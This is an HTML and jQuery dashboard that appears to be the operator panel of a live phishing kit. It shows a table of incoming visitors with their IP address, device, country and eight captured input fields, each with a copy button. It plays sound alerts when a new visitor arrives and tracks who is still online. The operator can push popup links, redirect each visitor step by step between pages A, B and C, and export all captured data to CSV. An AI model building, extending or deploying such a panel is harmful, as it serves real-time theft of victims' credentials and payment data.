<!DOCTYPE html>
<html>
    <head>
        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
        <title>Simple Web Page</title>
    </head>
    <body>

        <style>
            .table-container {
                width: 100%;
                overflow-x: scroll;
            }
            table {
                min-width: 100%;
                margin: 10px auto;
                font-size: .8rem;
            }
            table, tr, td, th {
                border: 1px solid #000;
                border-collapse: collapse;
                text-align: center;
            }
            .table-input {
                width: 50px;
            }
        </style>

        <div class="table-container">
            <button id="export-btn">Export CSV</button>
            <table id="userTable">
                <thead>
                  <tr>
                    <th>IP Address</th>
                    <th>OS</th>
                    <th>Browser</th>
                    <th>Device</th>
                    <th>User ID</th>
                    <th>Datetime</th>
                    <th>Span</th>
                    <th>Input 1</th>
                    <th>Input 2</th>
                    <th>Input 3</th>
                    <th>Input 4</th>
                    <th>Input 5</th>
                    <th>Input 6</th>
                    <th>Country</th>
                    <th>Input 7</th>
                    <th>Popup Opened</th>
                    <th>Popup Link</th>
                    <th>Main Link</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                </tbody>
            </table>
        </div>

        <audio id="sound">
            <source src="./ting.mp3" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>

        <audio id="popupSound">
            <source src="./ting2.mp3" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>


        <script src="./jquery.js"></script>
        <script>
            $(document).ready(function() {

                const socket = io();

                $.get('/users', data => {
                    data.forEach(user => {
                        $('table tbody').prepend(`
                            <tr userId="${user.userId}">
                                <td><span>${user.ipAddress}</span></td>
                                <td><span>${user.os}</span></td>
                                <td><span>${user.browserName}</span></td>
                                <td><span>${user.deviceName}</span></td>
                                <td><span>${user.userId}</span></td>
                                <td><span>${user.datetime}</span></td>
                                <td><span>${user.span}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input1}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input2}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input3}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input4}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input5}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input6}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td><span>${user.input7}</span></td>
                                <td><span>${user.input8}</span> <button class="table-copy">ðŸ“‹</button></td>
                                <td class="popup-open">
                                    <span>${user.popupOpen === true ? 'ðŸŸ©' : 'ðŸŸ¥'}</span>
                                    <button class="close-popup-btn" userId="${user.userId}" style="display: ${user.popupOpen === false ? 'none' : 'block'}">Close</button>
                                </td>
                                <td>
                                    <form class="popup-link-form" userId="${data.userId}">
                                        <input type="text" userId="${user.userId}" class="table-input">
                                        <button class="popup-link-button" userId="${user.userId}">âœ”</button>
                                    </form>
                                </td>
                                <td>
                                    <button class="redirect-btn" page="/" userId="${user.userId}">A</button>
                                    <button class="redirect-btn" page="/b" userId="${user.userId}">B</button>
                                    <button class="redirect-btn" page="/c" userId="${user.userId}">C</button>
                                </td>
                                <td>
                                    <button userId="${user.userId}" class="remove-btn">Remove</button>
                                </td>
                            </tr>
                        `)
                    });
                })

                function playSound() {
                    // Get the audio element
                    var audio = document.getElementById('sound');

                    // Check if the audio element is supported
                    if (audio) {
                        // Play the sound
                        audio.play();
                    } else {
                        console.error('Audio element is not supported.');
                    }
                }

                function playPopupSound() {
                    // Get the audio element
                    var audio = document.getElementById('popupSound');

                    // Check if the audio element is supported
                    if (audio) {
                        // Play the sound
                        audio.play();
                    } else {
                        console.error('Audio element is not supported.');
                    }
                }

                // $('html').mousemove(function() {
                //     playSound()
                // })
    
                socket.on('updateTable', (data) => {
                    $('table tbody').prepend(`
                        <tr userId="${data.userId}">
                            <td><span>${data.ipAddress}</span></td>
                            <td><span>${data.os}</span></td>
                            <td><span>${data.browserName}</span></td>
                            <td><span>${data.deviceName}</span></td>
                            <td><span>${data.userId}</span></td>
                            <td><span>${data.datetime}</span></td>
                            <td><span>${data.span}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input1}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input2}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input3}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input4}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input5}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input6}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input7}</span></td>
                            <td><span>${data.input8}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td class="popup-open">
                                <span>${data.popupOpen === true ? 'ðŸŸ©' : 'ðŸŸ¥'}</span>
                                <button class="close-popup-btn" userId="${data.userId}" style="display: ${data.popupOpen === false ? 'none' : 'block'}">Close</button>
                            </td>
                            <td>
                                <form class="popup-link-form" userId="${data.userId}">
                                    <input type="text" userId="${data.userId}" class="table-input">
                                    <button class="popup-link-button" userId="${data.userId}">âœ”</button>
                                </form>
                            </td>
                            <td>
                                <button class="redirect-btn" page="/" userId="${data.userId}">A</button>
                                <button class="redirect-btn" page="/b" userId="${data.userId}">B</button>
                                <button class="redirect-btn" page="/c" userId="${data.userId}">C</button>
                            </td>
                            <td>
                                <button userId="${data.userId}" class="remove-btn">Remove</button>
                            </td>
                        </tr>
                    `)

                    playSound()
                });

                socket.on('updateRow', (data) => {
                    var popupState = $(`table tbody tr[userId="${data.userId}"] .popup-open`).html()
                    $(`table tbody tr[userId="${data.userId}"]`).html(`
                            <td><span>${data.ipAddress}</span></td>
                            <td><span>${data.os}</span></td>
                            <td><span>${data.browserName}</span></td>
                            <td><span>${data.deviceName}</span></td>
                            <td><span>${data.userId}</span></td>
                            <td><span>${data.datetime}</span></td>
                            <td><span>${data.span}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input1}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input2}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input3}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input4}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input5}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input6}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td><span>${data.input7}</span></td>
                            <td><span>${data.input8}</span> <button class="table-copy">ðŸ“‹</button></td>
                            <td class="popup-open">
                                ${popupState}
                            </td>
                            <td>
                                <form class="popup-link-form" userId="${data.userId}">
                                    <input type="text" userId="${data.userId}" class="table-input">
                                    <button class="popup-link-button" userId="${data.userId}">âœ”</button>
                                </form>
                            </td>
                            <td>
                            <button class="redirect-btn" page="/" userId="${data.userId}">A</button>
                            <button class="redirect-btn" page="/b" userId="${data.userId}">B</button>
                            <button class="redirect-btn" page="/c" userId="${data.userId}">C</button>
                        </td>
                            <td>
                                <button userId="${data.userId}" class="remove-btn">Remove</button>
                            </td>
                    `)

                });

                socket.on('handlePopup', (userId, popupState) => {
                    $(`table tbody tr[userId="${userId}"] .popup-open`).html(`
                        <span>${popupState === true ? 'ðŸŸ©' : 'ðŸŸ¥'}</span>
                        <button class="close-popup-btn" userId="${userId}" style="display: ${popupState === false ? 'none' : 'block'}">Close</button>
                    `)

                    if (popupState === true) {
                        playPopupSound()
                    }
                });


                function isGapLessThan3Seconds(otherDatetime) {
                    // Create Date objects for the current datetime and the other datetime
                    const currentDatetime = new Date();
                    const otherDate = new Date(otherDatetime);

                    // console.log(otherDatetime, new Date().toLocaleString())

                    // Calculate the difference in milliseconds
                    const differenceInMilliseconds = Math.abs(currentDatetime - otherDate);

                    console.log(differenceInMilliseconds)

                    // Check if the difference is less than 3000 milliseconds (3 seconds)
                    return differenceInMilliseconds < 3000;
                }

                // let tableUsers = []
                let existingUsers = []

                socket.on('userExist', (userId) => {
                    const existInArrayIndex = existingUsers.findIndex(user => user.id === userId)
                    if (existInArrayIndex !== -1) {
                        existingUsers[existInArrayIndex].time = new Date().toLocaleString()
                    } else {
                        existingUsers.push({id: userId, time: new Date().toLocaleString()})
                    }
                })

                setInterval(() => {
                    $('table tbody tr').each(function() {
                        const existInArray = existingUsers.find(user => user.id === $(this).attr('userId'))
                        if (existInArray && isGapLessThan3Seconds(existInArray.time)) {
                            $(this).css('background', 'white')
                        } else {
                            $(this).css('background', 'lightgray')
                        }
                    })
                }, 1000);

                // setInterval(() => {
                //     tableUsers = []
                //     existingUsers = []
                //     $('table tbody tr').each(function() {
                //         socket.emit('checkResponse', $(this).attr('userId'))
                //         tableUsers.push($(this).attr('userId'))
                //     })
                //     setTimeout(() => {
                //         console.log(tableUsers, existingUsers)
                //     }, 3000);
                // }, 3000);

                // socket.on('userExist', (userId) => {
                //     console.log(existingUsers)
                //     const checkExistInArray = existingUsers.find(user => user === userId)
                //     if (!checkExistInArray) {
                //         existingUsers.push(userId)
                //     }
                // })

                setInterval(() => {
                    socket.emit('checkResponse')
                }, 1000);

                $('table').on('click', '.table-copy', function() {
                    navigator.clipboard.writeText($(this).parent().find('span').text())
                })

                $('table').on('submit', '.popup-link-form', function(e) {
                    e.preventDefault()

                    socket.emit('redirect', $(this).attr('userId'), $(this).find('input').val())
                    // $(this).prev().val('')
                })

                $('table').on('click', '.table-btn', function() {
                    socket.emit('finish', $(this).attr('userId'), $(this).parents('tr').find('.table-main-input').val())
                })

                $('table').on('click', '.open-popup-btn', function() {
                    socket.emit('openPopup', $(this).attr('userId'))
                })

                $('table').on('click', '.close-popup-btn', function() {
                    socket.emit('closePopup', $(this).attr('userId'))
                })

                $('table').on('click', '.remove-btn', function() {
                    socket.emit('removeUser', $(this).attr('userId'))
                })

                socket.on('removed', (userId) => {
                    $('table tr').each(function() {
                        if ($(this).attr('userId') === userId) {
                            $(this).remove()
                        } else {

                        }
                    })
                })

                let isButtonDisabled = false;
                $('table').on('click', '.refresh-btn', function() {
                    socket.emit('refreshPage', $(this).attr('userId'))
                    if (!$(this).prop('disabled')) {
                        // Disable the button
                        $(this).prop('disabled', true);

                        // Enable the button after 3500 milliseconds
                        setTimeout(() => {
                            $(this).prop('disabled', false);
                        }, 3500);
                    }
                    var userId = $(this).attr('userId')
                    $('table tr').each(function() {
                        if ($(this).attr('userId') === userId) {
                            var trRedirectBtn = $(this).find('.redirect-btn')
                            if (!trRedirectBtn.prop('disabled')) {
                                // Disable the button
                                trRedirectBtn.prop('disabled', true);

                                // Enable the button after 3500 milliseconds
                                setTimeout(() => {
                                    trRedirectBtn.prop('disabled', false);
                                }, 3500);
                            }
                        } else {

                        }
                    })
                })

                $('table').on('click', '.redirect-btn', function() {
                    socket.emit('userRedirect', $(this).attr('userId'), $(this).attr('page'))
                })

                socket.on('closePopup', (userId) => {
                    $('table tr').each(function() {
                        if ($(this).attr('userId') === userId) {
                            $(this).remove()
                        } else {

                        }
                    })
                })

                let closedPage = true
                socket.on('userClosedPage', (userId) => {
                    setTimeout(() => {
                        socket.emit('checkClosed', userId)
                    }, 500);

                    setTimeout(() => {
                        if (closedPage) {
                            $('table tr').each(function() {
                                if ($(this).attr('userId') === userId) {
                                    $(this).remove()
                                } else {
                                }
                            })
                            socket.emit('confirmClosed', userId)
                        } else {
                            closedPage = true
                        }
                    }, 3000);

                })

                socket.on('closeResponse', (userId) => {
                    closedPage = false
                })






                function convertArrayToCSV(array) {
                    const header = Object.keys(array[0]).join(',');
                    const csvRows = array.map(row =>
                        Object.values(row)
                        .map(value => (typeof value === 'string' && value.includes(',') ? `"${value}"` : value))
                        .join(',')
                    );
                    const csv = [header, ...csvRows].join('\n');
                    return csv;
                }

                function downloadCSV(array, fileName) {
                    const csv = convertArrayToCSV(array);
                    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
                    const link = document.createElement('a');

                    if (navigator.msSaveBlob) {
                        // IE 10+
                        navigator.msSaveBlob(blob, fileName);
                    } else {
                        // Other browsers
                        const url = URL.createObjectURL(blob);
                        link.href = url;
                        link.setAttribute('download', fileName);
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                    }
                }

                $('#export-btn').click(async function() {
                    $(this).text('Please Wait...');

                    try {
                        const data = await $.get('/allUsers');
                        downloadCSV(data, 'data.csv');
                    } catch (error) {
                        console.error('Error:', error);
                        // Handle the error if necessary
                    } finally {
                        // This block will be executed regardless of success or failure
                        $(this).text('Export CSV');
                    }
                });

            })

        </script>
    </body>
</html>